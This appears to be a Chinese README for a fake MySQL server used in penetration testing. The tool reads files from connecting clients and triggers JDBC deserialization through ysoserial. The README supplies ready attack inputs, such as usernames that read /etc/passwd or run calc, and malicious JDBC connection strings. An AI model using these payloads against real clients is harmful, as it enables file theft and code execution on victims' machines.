# MySQL Fake Server
用于渗透测试过程中的假MySQL服务器，纯原生python3实现，不依赖其它包。

无需编译MySQL插件，无需每次修改需要读取的文件。

修改自项目https://github.com/waldiTM/python-mysqlproto

## 用途

1. MySQL服务端恶意读取客户端文件漏洞
2. JDBC客户端Java反序列化漏洞

## 说明
1. 需要python3环境，无任何其它依赖。
2. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能。
3. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
4. 运行：`python server.py`

## 测试环境：
1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化)
2. PHPMyAdmin(Windows+Linux文件读取，可以使用相对路径读取php文件内容)
3. Navicat 12(Windows下文件读取)

## 使用方法
1. 文件读取：
    - 可以在config.json中fileread节中预定义好要读取的文件,key为用户名,value为要读取的文件名
    - 可以用fileread_开头的用户名(例如使用用户名fileread\_/etc/passwd来读取/etc/passwd文件)
2. 反序列化
    - 可在config.json中yso节预定义好yso payload的生成参数，key为用户名，value为ysoserial的参数
    - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就使用用户名yso\_Jdk7u21\_calc）
    - jdbc连接串示例：
      - 8.0.7以上：`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
      - 5.x:`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
    - **例如：** fileread\_/etc/passwd_clear

## 踩过的坑

1. SHOW VARIABLES 相关
   - 会读取两列，所以需要返回两列，否则会报错。
   - JDBC连接的时候回通过调用`SHOW VARIABLES`获取服务器变量，其中最重要的是两个时区变量`system_time_zone`和`time_zone`，在getObject过程，会调用到时区相关信息，没有这两个会直接报错
2. jdbc的Blob判定条件除了字段类型为blob，还要求字段声明的org_table字段不为空，flags大于128，否则会被当做text进行解析。（com.mysql.cj.protocol.a.NativeProtocol的findMysqlType方法）
3. 原python-mysqlproto中的序列检测需要去掉，否则会出错（这个应该是哪里处理有问题导致了序号重置）。
4. `SHOW SESSION STATUS`和`SHOW COLLATION`的公用列是第二列
5. mysql java connector 5.x的环境下，需要返回的server版本大于等于5.0.0才会走到`Util.resultSetToMap`进入getObject
## 顺便招个聘

欢迎各位大佬投递简历，大家一起来愉快地玩耍~^_^

https://www.anquanke.com/post/id/200462

## 参考资料

**项目基础：**
https://github.com/waldiTM/python-mysqlproto


膜拜大佬实现的Python版mysql协议，一切都是在此项目上进行的修改。

**漏洞相关:**

https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf

https://paper.seebug.org/1112/

https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload

**协议相关：**
https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html

https://dev.mysql.com/doc/internals/en/character-set.html

https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Data